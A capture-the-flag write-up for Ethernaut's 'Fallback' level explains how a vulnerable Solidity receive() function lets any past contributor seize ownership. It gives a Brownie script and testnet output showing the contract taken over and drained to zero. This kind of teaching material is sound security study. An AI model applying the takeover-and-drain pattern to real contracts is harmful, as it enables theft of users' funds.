---
title: Ethernaut - Level 01 - Fallback
date: 2022-08-02
---
{{<figure src="../images/fallback-1.svg" caption="_Image courtesy of OpenZeppelin_">}}
## Ethernaut 01 - Fallback
The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.

The code for the smart contract that we must exploit is shown above:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

If we want to solve this level, we must claim the contract's ownership and reduce its balance to 0. Before diving deep into solving this contract, lets briefly explain the `fallback` concept and what's the takeaway from this contract:

A `fallback` function basically lets a smart contract receive Ether from other contracts and wallets. If no fallback or known payable function has been defined, a smart contract can only receives Ether as a mining bonud or as the backup wallet of another contract that has self-destructed.

The security problem in this contract is located in the `receive` function, and the logic implemented within it, which is used to change the contract's ownership after specific requirements are meet.

It is important to understand that a fallback function can be called if:
- We first call a **function that does not exist** in the contract.
- We call a function **without providing the required data**.
- We send **Ether without any data** to the contract.

In this particular contract, there are two paths to become the contract's owner. The first option is by sending 1000 Ether to the contract and trigger the `payable` function, but this would require hours until we can accumulate such amount through a Rinkey Faucet. 

The other ooption is to use the `fallback` function, although we first need to meet the following criteria:

```solidity
require(msg.value > 0 && contributions[msg.sender] > 0),
```

This requires to have donated before to the contract and the winning fallback function call needs to contain some Ether value.


## Analyzing the contract
As this is our first Ethernaut challenge, lets analyze in details the source code and provide a walkthrough. Our first stop will be the `contribute` method, which has the following definition:

```solidity {lineos=table,hl_lines=[1,2],lineofstart=25}
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
The first statement uses `require` which will check if a condition is true, in this case it will check if the value submitted with the transaction is minor than 0.001 ether.

If the condition is true, the method will continue its execution, otherwise it will throw an exception, causing the whole execution to stop and revert its status.

The following statement is an update to the `contributions` map, which will include the address of the user that calls this method with the respective value that was sent, incrementing the overall value, as shown below:

```solidity {lineos=table,hl_lines=[1],lineofstart=26}
 contributions[msg.sender] += msg.value;
```

Last but not least, there is an additional condition that checks if the value transferred by the current caller is greater than the value given by the owner of the contract during the deployment process (1000 ether). If true, the current caller will become the new owner of the contract:

```solidity
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
```

The `contribute` method contains one of the vulnerabilities introduced in this contract, however, reaching out that quantity of Ethers will take too much time, therefore, we will not follow this path.

The next method available is `getContributions`, which returns the total value of total contributions made by whoever is calling the function, as shown below:

```solidity
function getContribution() public view returns (uint) {
    return contributions[msg.sender];
}
```

The next method is the `withdraw` one, which uses the `onlyOwner` modifier, therefore only those users whose address is stored in the `owner` state variable can call this function, otherwise, the execution will fail:

```solidity
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```

The purpose that this function serves is to transfer all the balance associated with this contract to the address stored in the `owner` state variable. That means that the contract’s owner can call this function at any time and transfer all the funds in the contract to his address.

Last but not least, there is the `receive` function. This is a special function in Solidity which allows us to send money to the contract, since behaves as a `fallback` function. Notwithstanding, this function cannot have arguments, cannot return anything and must have `external` visibility and `payable` state mutability:


```solidity
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

According to Solidity’s documentation:

> The `receive` function is executed on a call to the contract with empty calldata. This is the function that is executed on plain Ether transfers. If no such function exists, but a payable fallback function exists, the fallback function will be called on a plain Ether transfer. If neither a `receive` Ether nor a `payable` fallback function is present,  the contract cannot receive Ether through regular transactions and throws an exception

In this case, the `receive` function has a `require` statement, which demands:

- To have contributed Ether from the account address to the contract in the past.
- The function call needs to have some Ether value.

If these two conditions are met, the contract’s owner will change and an attacker could potentially take control over it, transferring all the funds available and reducing the contract’s balance to 0.

## Hacking the contract
There are different ways to exploit this vulnerability, but we are going to focus on using the [Brownie framework](https://eth-brownie.readthedocs.io/en/stable/), a development and testing framework for smart contracts targeting the EVM.

Our first step will be to get some test ether through a [Rinkeby faucet](https://rinkebyfaucet.com/).

After this, we will create a brownie project and define an interface. **Interfaces** are used to call functiosn from another contract in your newly deployed contract. For this interface we will declare the `owner()`, `contribute()` and `withdraw()` methods:

```solidity {lineos=table,hl_lines=[5,6,7],lineofstart=1}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IFallback {
    function owner() external view returns(address payable);
    function contribute() external;
    function withdraw() external;
}
```

On the other hand, the proof of concept that will be used to drain the contract’s funds and become its owner :

```solidity {lineos=table,hl_lines=[4,6,8,10],lineofstart=1}
from brownie import accounts, config, interface, web3, Fallback

def attack(target, hacker):
    fallback = interface.IFallback(target)
    # to ensure that contributions[hacker] will be greater than 0
    fallback.contribute({'from': hacker, 'amount': '0.0005 ether'})
    # call 'receive' 
    hacker.transfer(to=target, amount="0.001 ether")
    print(f"Owner is hacker: {fallback.owner() == hacker.address}")
    fallback.withdraw({'from': hacker})
    print(f"Final contract balance: {web3.eth.getBalance(target)}")

def main(target):
		# Obtain the attacker's wallet address from the .env file
    hacker = accounts.add(config['wallets']['from_key'])
    attack(target, hacker)
```

Our main function starts using the `accounts.add` method, used to recover our account (where the funds are going to be transferred) using the private key specified in the `.env` file.

```solidity
hacker = accounts.add(config['wallets']['from_key'])
```

After this, a call to the `attack` method providing as arguments the address for the contract that we want to attack and the address for our contract is performed:

```solidity
attack(target, hacker)
```

Our attack function will be divided into three steps:

1. Perform a contribution to the contract for less than 0.001 ether. This will help meet the requirements defined in the contract’s `receive` function.
2. Perform a call to the `receive` method through `hacker.transfer`. Which will meet the condition as the amount transferred will be greater than `0` and our contract has done a previous contribution in the step before. This will immediately make us owners of the contract.
3. Last step is to withdraw the funds associated to the contract, as we are now the legitimate owner.


Last but not least, the script can be executed through the `brownie run` command, successfully hacking the first level of the Ethernaut challenge, as shown below:

```bash
root@vmi828562 ~/r/e/f/scripts#
brownie run attack main "0xfb6EFDB9bE117904a9E9eFF7Fcf6E2cff9BC781f" --network rinkeby
Brownie v1.18.1 - Python development framework for Ethereum


Running 'attack.py::main'...
Transaction sent: 0x56e5062c600e5b9d9fac22ce4333c7b32a0e4737bb2dcf646a304a9b9f8e1aef
  Gas price: 2.654972458 gwei   Gas limit: 31803   Nonce: 16
  Transaction confirmed   Block: 10681696   Gas used: 28912 (90.91%)

Transaction sent: 0xfd5dc46feac1abca358d3625029461a1231732bf30c2461033435dd3a4084b84
  Gas price: 2.530514464 gwei   Gas limit: 30522   Nonce: 17
  Transaction confirmed   Block: 10681697   Gas used: 25549 (83.71%)

Owner is hacker: True
Transaction sent: 0x3457feb604162a2dfb0f020302aac25f3b1b691dd87ddb2bf4122faedb6ada94
  Gas price: 2.479560643 gwei   Gas limit: 35918   Nonce: 18
  Waiting for confirmation... \
  Transaction confirmed   Block: 10681747   Gas used: 30398 (84.63%)

Final contract balance: 0
```

## Takeaways
As you may have noticed, this challenge is about understanding the concept behind a `fallback` function and how to keep it simple, avoiding dangerous implementations used to change a contract ownership.
